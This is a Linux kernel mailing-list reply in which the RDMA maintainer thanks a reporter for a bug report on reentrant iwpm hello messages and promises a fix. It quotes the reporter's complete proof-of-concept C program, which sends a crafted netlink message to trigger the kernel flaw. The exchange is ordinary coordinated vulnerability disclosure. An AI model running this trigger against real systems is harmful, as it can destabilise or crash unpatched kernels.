Return-Path: <linux-rdma+bounces-6766-lists+linux-rdma=lfdr.de@vger.kernel.org>
X-Original-To: lists+linux-rdma@lfdr.de
Delivered-To: lists+linux-rdma@lfdr.de
Received: from ny.mirrors.kernel.org (ny.mirrors.kernel.org [IPv6:2604:1380:45d1:ec00::1])
	by mail.lfdr.de (Postfix) with ESMTPS id 8530C9FE9D7
	for <lists+linux-rdma@lfdr.de>; Mon, 30 Dec 2024 19:28:40 +0100 (CET)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by ny.mirrors.kernel.org (Postfix) with ESMTPS id 3DB921621A2
	for <lists+linux-rdma@lfdr.de>; Mon, 30 Dec 2024 18:28:38 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id C4C5A1B0422;
	Mon, 30 Dec 2024 18:28:35 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b="JClngSwb"
X-Original-To: linux-rdma@vger.kernel.org
Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 811281ACECE;
	Mon, 30 Dec 2024 18:28:34 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1735583315; cv=none; b=KzMf9/9LlgJjJgmynnnR5Y/jaKOnSly3zTS1ns2wVLTUD8jv1bn1eyoS3Akeo78pw7HvFur80cKQOT8LGuNUbw4KsOPrE8GxdJp0d/5thFiByHqS4uGsggVPj6GDc8G9AIybawDJwH+SzHyz5kbcJT7whxsJqQNVqWS7eaYfIfA=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1735583315; c=relaxed/simple;
	bh=v+5TJuyGQ7FZI5x52e8Nknbx3udqo1k85KMy5imkNsU=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=OSdmzUHMp879cE+VjxO/zki8pC6sfKawVB2oZymwpdplPNCiItU47glzIrUc5oQbqU5BzuqbuFFgstyCiGvWuXpNFm0+YTKwcOpNi6hpi7aIzACncsKJBMcHi7aJ8gv/VCXKD6Q11NqnT4scFqGXrn2qpFEjyxZYYyUrbew8thE=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (2048-bit key) header.d=kernel.org header.i=@kernel.org header.b=JClngSwb; arc=none smtp.client-ip=10.30.226.201
Received: by smtp.kernel.org (Postfix) with ESMTPSA id 7705DC4CED0;
	Mon, 30 Dec 2024 18:28:33 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=kernel.org;
	s=k20201202; t=1735583314;
	bh=v+5TJuyGQ7FZI5x52e8Nknbx3udqo1k85KMy5imkNsU=;
	h=Date:From:To:Cc:Subject:References:In-Reply-To:From;
	b=JClngSwbUXDt2qTZUtjzxJtwv+QlIbnnQLrAz27PUaBbabZ+E6m4WAD/M4w3tKTuT
	 eZconVvnBIr3i6JRbX7Rb4vVVrw9nzS8c+pYfOIa4kPVVD885inFe4T3NqxTFTWtKl
	 vDjYfNC+kV8sTCy2/sr20bOwn2tJi5JB/T5yxaELZZbFh+ZLxzkqFVr4iI+sM39A8x
	 bCjvb0BU19fa2SXg5+1Rtp9vVj8+wvGare6ctS/IlCOb4o6/aAuPIkB7V4Dx2NaFin
	 8JOQ9DnIQ4z7TYTJ0nOdWDje5hxJBPI1c1vdPz2w6HtkfN1Q/I+DVBpLU96bLFUaih
	 MFuOnTQHtiqvg==
Date: Mon, 30 Dec 2024 20:28:28 +0200
From: Leon Romanovsky <leon@kernel.org>
To: Lin Ma <linma@zju.edu.cn>
Cc: jgg@ziepe.ca, cmeiohas@nvidia.com, michaelgur@nvidia.com,
	linux-rdma@vger.kernel.org, linux-kernel@vger.kernel.org
Subject: Re: [bug report] RDMA/iwpm: reentrant iwpm hello message
Message-ID: <20241230182828.GA81460@unreal>
References: <661ee85f.a4a2.193e4b2f91b.Coremail.linma@zju.edu.cn>
 <20241224092938.GC171473@unreal>
 <103c061b.e87e.193f84b0840.Coremail.linma@zju.edu.cn>
 <20241224141127.GH171473@unreal>
 <48307bf.eecb.193f974dadf.Coremail.linma@zju.edu.cn>
 <20241224192616.GI171473@unreal>
 <24cc4fc5.f216.193fb898b6c.Coremail.linma@zju.edu.cn>
Precedence: bulk
X-Mailing-List: linux-rdma@vger.kernel.org
List-Id: <linux-rdma.vger.kernel.org>
List-Subscribe: <mailto:linux-rdma+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-rdma+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <24cc4fc5.f216.193fb898b6c.Coremail.linma@zju.edu.cn>

On Wed, Dec 25, 2024 at 09:58:35AM +0800, Lin Ma wrote:
> 
> > 
> > Do you have reproducer for that?
> > 
> 
> Yep, I attached the PoC code, please enable CONFIG_INFINIBAND
> for testing.

Thanks a lot for the repro. I wonder why iWARP folks never complained
about it, Anyway I have local fix, but need to test it before sending,
will do after New Year holidays.

Thanks again.

> 
> Thanks
> By the way, Merry Christmas~
> 

> // gcc poc.c -static -o poc.elf -lmnl
> #include <stdio.h>
> #include <stdlib.h>
> #include <stdint.h>
> #include <string.h>
> #include <stdbool.h>
> 
> #include <libmnl/libmnl.h>
> 
> #define PAGE_SIZE 0x1000
> #define RDMA_NL_GET_CLIENT(type) ((type & (((1 << 6) - 1) << 10)) >> 10)
> #define RDMA_NL_GET_OP(type) (type & ((1 << 10) - 1))
> #define RDMA_NL_GET_TYPE(client, op) ((client << 10) + op)
> #define RDMA_NL_IWCM (2)
> #define IWPM_NLA_HELLO_ABI_VERSION (1)
> 
> enum
> {
>     RDMA_NL_IWPM_REG_PID = 0,
>     RDMA_NL_IWPM_ADD_MAPPING,
>     RDMA_NL_IWPM_QUERY_MAPPING,
>     RDMA_NL_IWPM_REMOVE_MAPPING,
>     RDMA_NL_IWPM_REMOTE_INFO,
>     RDMA_NL_IWPM_HANDLE_ERR,
>     RDMA_NL_IWPM_MAPINFO,
>     RDMA_NL_IWPM_MAPINFO_NUM,
>     RDMA_NL_IWPM_HELLO,
>     RDMA_NL_IWPM_NUM_OPS
> };
> 
> int main(int argc, char const *argv[])
> {
>     struct mnl_socket *sock;
>     struct nlmsghdr *nlh;
>     char buf[PAGE_SIZE];
>     int err;
> 
>     sock = mnl_socket_open(NETLINK_RDMA);
>     if (sock == NULL)
>     {
>         perror("mnl_socket_open");
>         exit(-1);
>     }
> 
>     nlh = mnl_nlmsg_put_header(buf);
>     nlh->nlmsg_type = RDMA_NL_GET_TYPE(RDMA_NL_IWCM, RDMA_NL_IWPM_HELLO);
>     nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
>     nlh->nlmsg_seq = 1;
>     nlh->nlmsg_pid = 0;
> 
>     // static const struct nla_policy hello_policy[IWPM_NLA_HELLO_MAX] = {
>     //     [IWPM_NLA_HELLO_ABI_VERSION]     = { .type = NLA_U16 }
>     // };
>     mnl_attr_put_u16(nlh, IWPM_NLA_HELLO_ABI_VERSION, 3);
> 
>     err = mnl_socket_sendto(sock, buf, nlh->nlmsg_len);
>     if (err < 0)
>     {
>         perror("mnl_socket_sendto");
>         exit(-1);
>     }
>     return 0;
> }


